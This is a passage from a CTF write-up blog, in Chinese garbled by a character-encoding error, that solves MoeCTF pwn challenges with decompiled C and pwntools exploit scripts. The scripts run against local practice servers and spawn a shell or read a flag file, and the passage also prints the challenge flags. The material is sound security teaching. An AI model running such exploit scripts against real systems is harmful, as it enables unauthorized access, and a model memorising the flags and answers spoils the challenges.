<p>å¯ä»¥çœ‹åˆ°å‡ºç°äº†ä¸€å †DEBUGå¼€å¤´ä¸œè¥¿ï¼Œé‚£æ˜¯pwntoolsæ¡†æ¶æ‰§è¡Œäº§ç”Ÿçš„æ—¥å¿—ï¼Œä¸ç”¨ç®¡ï¼Œç›´æ¥ç¿»åˆ°æœ€ä¸‹æ–¹å°±èƒ½æ‰¾åˆ°flagã€‚</p>
<p>è·Ÿé¢˜ç›®ä¸­æä¾›çš„åˆå§‹æ”»å‡»è„šæœ¬è¿›è¡Œå¯¹æ¯”ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *                                    <span class="hljs-comment"># å¯¼å…¥ pwntoolsã€‚</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <span class="hljs-comment"># ä¸€äº›åŸºæœ¬çš„é…ç½®ã€‚</span><br><br><span class="hljs-comment"># æœ‰æ—¶æˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°è°ƒè¯•è¿è¡Œç¨‹åºï¼Œéœ€è¦é…ç½® context.terminalã€‚è¯¦è§å…¥é—¨æŒ‡åŒ—ã€‚</span><br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)             # åœ¨æœ¬åœ°è¿è¡Œç¨‹åºã€‚</span><br><span class="hljs-comment"># gdb.attach(io)                    # å¯åŠ¨ GDB</span><br>io = connect(???, ???)              <span class="hljs-comment"># ä¸åœ¨çº¿ç¯å¢ƒäº¤äº’ã€‚</span><br>io.sendline(<span class="hljs-string">b&#x27;114511&#x27;</span>)              <span class="hljs-comment"># ä»€ä¹ˆæ—¶å€™ç”¨ send ä»€ä¹ˆæ—¶å€™ç”¨ sendlineï¼Ÿ</span><br><br>payload  = p32(<span class="hljs-number">0xdeadbeef</span>)          <span class="hljs-comment"># p32(0xdeadbeef)ã€b&quot;\xde\xad\xbe\xef&quot;ã€b&quot;deadbeef&quot; æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</span><br>                                    <span class="hljs-comment"># ä½ çœ‹æ‡‚åŸç¨‹åºè¿™é‡Œçš„æ£€æŸ¥é€»è¾‘äº†å—ï¼Ÿ</span><br>payload += <span class="hljs-string">b&#x27;shuijiangui&#x27;</span>           <span class="hljs-comment"># strcmp</span><br><br>io.sendafter(<span class="hljs-string">b&#x27;password.&#x27;</span>, payload) <span class="hljs-comment"># å‘é€ï¼é€šè¿‡æ‰€æœ‰çš„æ£€æŸ¥ã€‚</span><br><br>io.interactive()                    <span class="hljs-comment"># æ‰‹åŠ¨æ¥æ”¶ flagã€‚</span><br></code></pre></td></tr></table></figure>

<p>å›ç­”é‡Œé¢çš„é—®é¢˜ï¼š</p>
<p>sendlineï¼šä¼šåœ¨å‘é€çš„å†…å®¹æœ«å°¾è‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªæ¢è¡Œç¬¦ \nã€‚é€‚ç”¨äºç¨‹åºä½¿ç”¨ scanf æˆ– gets ç­‰ä»¥æ¢è¡Œç¬¦ä½œä¸ºç»“æŸæ ‡å¿—æ¥è¯»å–æ•°æ®çš„æƒ…å†µï¼ˆå¦‚æœ¬é¢˜çš„ç¬¬ä¸€å…³å¯†ç è¾“å…¥ï¼‰ã€‚</p>
<p>sendï¼šåªå‘é€åŸå§‹å­—èŠ‚ï¼Œä¸é™„åŠ ä»»ä½•å­—ç¬¦ã€‚é€‚ç”¨äºç¨‹åºä½¿ç”¨ read(0, buf, size) æŒ‰å­—èŠ‚é•¿åº¦è¯»å–çš„æƒ…å†µã€‚åœ¨æ„é€  Payload ç»•è¿‡ bypass å‡½æ•°æ—¶ï¼Œä½¿ç”¨ send æˆ– sendafter æ›´å®‰å…¨ï¼Œå› ä¸ºå¤šå‡ºçš„æ¢è¡Œç¬¦å¯èƒ½ä¼šç ´åç²¾å¿ƒæ„é€ çš„å†…å­˜å¸ƒå±€ã€‚</p>
<p>p32(0xdeadbeef)ï¼šè¿™æ˜¯ Pwntools çš„å‡½æ•°ï¼Œå®ƒä¼šå°†æ•´æ•°è½¬æ¢ä¸ºå¯¹åº”çš„ 4 å­—èŠ‚åŸå§‹å­—èŠ‚æµï¼Œå¹¶è‡ªåŠ¨å¤„ç†å°ç«¯åºï¼ˆç»“æœä¸º \xef\xbe\xad\xdeï¼‰ã€‚è¿™æ˜¯æœ¬é¢˜æœ€æ­£ç¡®çš„å†™æ³•ã€‚</p>
<p>bâ€\xde\xad\xbe\xefâ€ï¼šè¿™æ˜¯ Python çš„åŸå§‹å­—èŠ‚ä¸²è¡¨ç¤ºæ³•ï¼Œè™½ç„¶æ˜¯å­—èŠ‚å½¢å¼ï¼Œä½†å®ƒçš„é¡ºåºæ˜¯å¤§ç«¯åºã€‚é™¤éç›®æ ‡æœºå™¨æ˜¯å¤§ç«¯åºï¼Œå¦åˆ™æ— æ³•é€šè¿‡ *(_DWORD *)a1 &#x3D;&#x3D; -559038737 çš„æ£€æŸ¥ã€‚</p>
<p>bâ€deadbeefâ€ï¼šè¿™æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œåœ¨å†…å­˜ä¸­ä»£è¡¨çš„æ˜¯å­—ç¬¦çš„ ASCII ç ï¼Œè·Ÿ -559038737 å®Œå…¨ä¸æ­è¾¹ã€‚</p>
<p><strong>moectf{tH3_B3gINnING-Of-FORMaT2493f9f50}</strong></p>
<h2 id="1-ez-u64"><a href="#1-ez-u64" class="headerlink" title="1 ez_u64"></a>1 ez_u64</h2><p>ä¾æ—§æ˜¯ä¸€ä¸ªpwnæ–‡ä»¶ï¼Œå…ˆIDAåç¼–è¯‘ä¸€ä¸‹ï¼Œå¾—åˆ°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åªèƒ½çœ‹åˆ°ä¸€ä¸ªvuln(),åŒå‡»å®ƒçœ‹çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ya hello! Let&#x27;s play a game.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Guess which number I&#x27;m thinking of.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the hint.&quot;</span>);<br>  write(<span class="hljs-number">1</span>, &amp;num, <span class="hljs-number">8u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt;&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%zu&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 != num )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong answer!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try pwntools u64?&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Win!&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28u</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è§‚å¯Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">write(<span class="hljs-number">1</span>, &amp;num, <span class="hljs-number">8u</span>);<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯åˆ©ç”¨writeå‡½æ•°åœ¨å†…å­˜é‡ŒæŠ“å–äº†å…¨å±€å˜é‡numçš„8ä¸ªå­—èŠ‚çš„åŸå§‹æ•°æ®å¹¶è¾“å‡ºä¸ºå­—èŠ‚æµï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ¥æ”¶è¿™ä¸ªå­—èŠ‚æµã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">__isoc99_scanf(<span class="hljs-string">&quot;%zu&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 != num )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong answer!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try pwntools u64?&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>scanfå‡½æ•°ç­‰å¾…çš„è¾“å…¥ç±»å‹æ˜¯%zuï¼Œæ„æ€æ˜¯è¦ä½ è¾“å…¥ä¸€ä¸²æ•°å­—ï¼Œå®ƒä¼šè½¬åŒ–æˆä¸€ä¸ªsize_tå¤§å°çš„æ— ç¬¦å·æ•´æ•°å‚¨å­˜åˆ°å†…å­˜å˜é‡v1ã€‚è‡³äºsize_tæ˜¯å¤šå¤§ï¼Œç”±äºç°åœ¨ä½¿ç”¨çš„æ˜¯64ä½ç³»ç»Ÿï¼Œæ‰€ä»¥å 8ä¸ªå­—èŠ‚ã€‚</p>
<p>éšåä¼šè¿›è¡Œä¸€æ¬¡åˆ¤æ–­çœ‹æ˜¯å¦å’Œnumç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰ï¼Œä¼šæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>,ä¹Ÿå°±æ˜¯ä¼šç»™ä½ ä¸€ä¸ªç³»ç»Ÿçš„æ§åˆ¶æƒï¼Œè¿™æ ·æˆ‘ä»¬å°±ç ´è§£äº†è¿™ä¸ªç¨‹åºï¼Œä»è€Œå¯¹å®ƒä¸ºæ‰€æ¬²ä¸ºã€‚</p>
<p>ç”±äºnumçš„æ•°æ®å·²ç»å‘é€ç»™æˆ‘ä»¬äº†ï¼Œåªéœ€è¦è½¬æ¢ä¸ºæ•°å­—å½¢å¼å‘å›å»å°±å¯ä»¥ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°pwntoolsé‡Œçš„u64ï¼Œå®ƒå¯ä»¥å°†æ¥æ”¶åˆ°çš„ 8 å­—èŠ‚åŸå§‹æ•°æ®è½¬æ¢å›æ•´æ•°ã€‚è¿™æ ·åšä¸ä»…æ–¹ä¾¿ï¼Œä¹Ÿé¿å…äº†å› ä¸ºå‘é€çš„åŸå§‹æ•°æ®æ˜¯ä¸å¯è§å­—ç¬¦å¯¼è‡´æ— æ³•è¯†åˆ«çš„å¯èƒ½ã€‚</p>
<p>å¥½çš„ï¼Œå·²ç»çœ‹ç©¿äº†å¥—è·¯ï¼Œæ˜¯æ—¶å€™ç¼–å†™æ”»å‡»è„šæœ¬äº†ï¼ğŸ§¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">11965</span>) <span class="hljs-comment">#åˆ«å¿˜äº†æ›¿æ¢æˆå®é™…çš„ç«¯å£ï¼</span><br><br><span class="hljs-comment"># æ¥æ”¶ Hint (å³ num çš„åŸå§‹ 8 å­—èŠ‚æ•°æ®)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Here is the hint.&quot;</span>)<br><br><span class="hljs-comment"># read(1, &amp;num, 8u) å‘é€äº† 8 ä¸ªå­—èŠ‚ï¼Œç”¨ recvn(8) ç²¾å‡†æ¥æ”¶</span><br>leak_data = p.recvn(<span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># ä½¿ç”¨u64å°†å­—èŠ‚æµè½¬æ¢ä¸ºæ•´æ•°</span><br>target_num = u64(leak_data)<br><br><span class="hljs-comment"># é‡‡ç”¨sendlineafter é™åˆ¶å‘é€æ—¶æœºï¼Œlineé€‚ç”¨äºscanfå‡½æ•°ã€‚b&quot;&gt;&quot;è¡¨ç¤ºç­‰å¾…&gt;æç¤ºç¬¦å†æ‰§è¡Œå‡½æ•°ã€‚</span><br><span class="hljs-comment"># target_numæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œéœ€è¦å…ˆè½¬å­—ç¬¦ä¸²å†è½¬å­—èŠ‚æµå†å‘é€</span><br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(target_num).encode())<br><br><span class="hljs-comment"># æ‹¿åˆ° Shell</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ä¿å­˜ä¸ºexp.pyï¼Œæ‰”è¿›é¢˜ç›®æ–‡ä»¶å¤¹ä¸­ï¼Œç›´æ¥å¯åŠ¨</p>
<figure>
  <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 225051.png" srcset="/img/loading.gif" lazyload>
  <figcaption></figcaption>
</figure>

<p>çœ‹åˆ°Win!å°±è¯´æ˜æˆåŠŸäº†ï¼Œç°åœ¨æˆ‘ä»¬ä¸´æ—¶æ‹¥æœ‰äº†ç®¡ç†å‘˜æƒé™ï¼Œç”¨lsæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<figure>
  <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 225105.png" srcset="/img/loading.gif" lazyload>
  <figcaption></figcaption>
</figure>

<p>æ‰¾åˆ°åä¸ºflagçš„æ–‡ä»¶ï¼Œç”¨<code>cat flag</code>è¯»å–å®ƒ</p>
<figure>
  <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 225116.png" srcset="/img/loading.gif" lazyload>
  <figcaption></figcaption>
</figure>

<p><strong>moectf{u53ful-TH1ng5-IN-pWNTOOls31911f3e}</strong></p>
<h2 id="1-find-it"><a href="#1-find-it" class="headerlink" title="1 find it"></a>1 find it</h2><p>æ‹¿åˆ°é™„ä»¶åIDAåç¼–è¯‘ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> file[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  init(argc, argv, envp);<br>  v3 = dup(<span class="hljs-number">1</span>);<br>  write(v3, <span class="hljs-string">&quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;</span>, <span class="hljs-number">0x2Fu</span>);<br>  close(<span class="hljs-number">1</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd1);<br>  write(fd1, <span class="hljs-string">&quot;You are right.What would you like to see?\n&quot;</span>, <span class="hljs-number">0x2Au</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s%*c&quot;</span>, file);<br>  open(file, <span class="hljs-number">0</span>);<br>  write(fd1, <span class="hljs-string">&quot;What is its fd?\n&quot;</span>, <span class="hljs-number">0x10u</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd2);<br>  read(fd2, &amp;buf, <span class="hljs-number">0x50u</span>);<br>  write(fd1, &amp;buf, <span class="hljs-number">0x50u</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¢˜ç›®æè¿°å‘Šè¯‰æˆ‘ä»¬è·Ÿfdæœ‰å…³ã€‚fdå°±æ˜¯Linuxçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç›¸å½“äºç»™æ–‡ä»¶ç¼–å·ï¼Œæ¯è¿è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼Œé»˜è®¤å·²ç»åˆ†é…äº†0ï¼Œ1ï¼Œ2ä¸‰ä¸ªfdï¼š</p>
<p>0,STDIN (æ ‡å‡†è¾“å…¥),é»˜è®¤æŒ‡å‘ä½ çš„é”®ç›˜ã€‚</p>
<p>1,STDOUT (æ ‡å‡†è¾“å‡º),é»˜è®¤æŒ‡å‘ä½ çš„å±å¹•ã€‚</p>
<p>2,STDERR (æ ‡å‡†é”™è¯¯),é»˜è®¤ä¹ŸæŒ‡å‘ä½ çš„å±å¹•ï¼Œä¸“é—¨ç”¨æ¥æŠ¥é”™ã€‚</p>
<p>ç”±äºLinuxæœ‰ **â€œä¸€åˆ‡çš†æ–‡ä»¶â€**çš„å“²å­¦ï¼Œæ‰€ä»¥è¾“å…¥è¾“å‡ºè¿™ç§æŠ½è±¡çš„ä¸œè¥¿ä¹Ÿè¢«å½“ä½œæ–‡ä»¶å¤„ç†ã€‚</p>
<p>å½“æ–°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æˆ–ç€æ‰‹åŠ¨åˆ†é…ä¸€ä¸ªfdæ—¶ï¼Œä¼šä¼˜å…ˆä»æœ€å°çš„æ­£æ•´æ•°å¼€å§‹åˆ†é…ã€‚</p>
<p>æœ¬é¢˜ä¸­ï¼Œé¦–å…ˆæ‰§è¡Œäº†<code>v3 = dup(1)</code>ã€‚dupå‡½æ•°çš„ä½œç”¨æ˜¯è®©ç¨‹åºåˆ†é…ä¸€ä¸ªfdæŒ‡å‘è·Ÿdupå‡½æ•°å˜é‡å€¼å¯¹åº”çš„fdæŒ‡å‘ç›¸åŒçš„ä½ç½®ï¼Œè¿™é‡Œæ˜¯è¦æŒ‡å‘1æ‰€æŒ‡çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯å±å¹•ï¼Œç”±äº0ï¼Œ1ï¼Œ2å·²è¢«å ç”¨ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ªåˆ†é…çš„æ•°å­—æ˜¯3ã€‚å°†å˜é‡v3èµ‹å€¼ä¸º3ã€‚</p>
<p>ä¾æ¬¡å®¡è®¡å…³é”®éƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C">write(v3, <span class="hljs-string">&quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;</span>, <span class="hljs-number">0x2Fu</span>);<br>close(<span class="hljs-number">1</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd1);<br></code></pre></td></tr></table></figure>

<p>writeå‡½æ•°åˆ©ç”¨æ–°åˆ†é…çš„fdï¼Œä¹Ÿå°±æ˜¯v3è®©å±å¹•æ˜¾ç¤ºå‡ºäº†ä¸€æ®µè¯ï¼Œé—®ä½ èƒ½ä¸èƒ½æ‰¾åˆ°æ§åˆ¶è¾“å‡ºçš„fdï¼Œå¹¶å…³é—­äº†åŸæœ‰çš„fd1ï¼Œç­‰å¾…è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¿™é‡Œéœ€è¦è¾“å…¥ä¸€ä¸ªfdçš„ç¼–å·ã€‚æ—¢ç„¶1æ²¡äº†ï¼Œé‚£å°±å‰©ä¸‹åˆšåˆšåˆ†é…çš„3äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">write(fd1, <span class="hljs-string">&quot;You are right.What would you like to see?\n&quot;</span>, <span class="hljs-number">0x2Au</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%s%*c&quot;</span>, file);<br></code></pre></td></tr></table></figure>

<p>é—®ä½ æƒ³è¦çœ‹ä»€ä¹ˆï¼Œè¦è¾“å…¥ä¸€ä¸ªè¢«èµ‹ç»™fileçš„å­—ç¬¦ä¸²ï¼Œç¨‹åºä¼šå°†å®ƒè¯†åˆ«ä¸ºæ–‡ä»¶åã€‚æˆ‘ä»¬æ˜¯æ¥æ‰¾flagçš„ï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶è¦è¾“å…¥â€œflagâ€è¿™ä¸²å­—ç¬¦ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C">open(file, <span class="hljs-number">0</span>);<br>write(fd1, <span class="hljs-string">&quot;What is its fd?\n&quot;</span>, <span class="hljs-number">0x10u</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd2);<br></code></pre></td></tr></table></figure>

<p>ç¨‹åºæ‰“å¼€äº†æˆ‘ä»¬æƒ³çœ‹çš„æ–‡ä»¶ï¼Œå®ƒè¿˜æ€ªå¥½çš„å‘¢ã€‚æ³¨æ„è¿™æ—¶å€™ç¨‹åºä¼šåˆ†é…æ–°çš„fdç»™è¿™ä¸ªæ–‡ä»¶ï¼Œè€Œåˆšæ‰1è¢«å…³é—­äº†ï¼Œç°åœ¨æ˜¯ç©ºé—²çŠ¶æ€ï¼Œæ‰€ä»¥æ­¤æ—¶è¿™ä¸ªæ–°æ‰“å¼€çš„æ–‡ä»¶çš„fdæ˜¯1ã€‚é—®æˆ‘ä»¬è¿™ä¸ªæ–‡ä»¶çš„fdï¼Œæ‰€ä»¥å›ç­”1ã€‚</p>
<p>ç”±æ˜¯ç¼–å†™è„šæœ¬exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,å®é™…ç«¯å£)<br><br>p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br><br>p.sendline(<span class="hljs-string">b&quot;flag&quot;</span>)<br><br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œè½»æ¾æ‹¿ä¸‹</p>
<figure>
  <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 235032.png" srcset="/img/loading.gif" lazyload>
  <figcaption></figcaption>
</figure>

<p>çŸ¥é“è§£é¢˜æµç¨‹åç”¨ncatè¿æ¥æ‰‹åŠ¨äº¤äº’ä¹Ÿå¯ä»¥å“¦</p>
<figure>
  <img src="/img/å±å¹•æˆªå›¾ 2026-02-04 001241.png" srcset="/img/loading.gif" lazyload>
  <figcaption></figcaption>
</figure>

<p><strong>moectf{fINd_TH3_h1Dd3N_Fdf0326763dc}</strong></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E7%BD%91%E5%AE%89%E4%B9%8B%E8%B7%AF/" class="print-no-link">#ç½‘å®‰ä¹‹è·¯</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CTFåˆ·é¢˜-pwnï¼ˆ1ï¼‰</div>
      <div>https://koyanrush.github.io/2026/02/03/Moectfpwn1/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Koyanrush</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2026å¹´2æœˆ3æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2026/02/02/CTFShowmisc1/" title="CTFåˆ·é¢˜-miscï¼ˆ1ï¼‰">
                        <span class="hidden-mobile">CTFåˆ·é¢˜-miscï¼ˆ1ï¼‰</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="waline"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#waline', function() {
      Fluid.utils.createCssLink('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.css')
      Fluid.utils.createScript('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.js', function() {
        var options = Object.assign(
          {"serverURL":"https://waline.icant.qzz.io","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10,"placeholder":"æ¥èŠä¸¤å¥å§ ~"},
          {
            el: '#waline',
            path: window.location.pathname
          }
        )
        Waline.init(options);
        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
          var imgSelector = '#waline .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
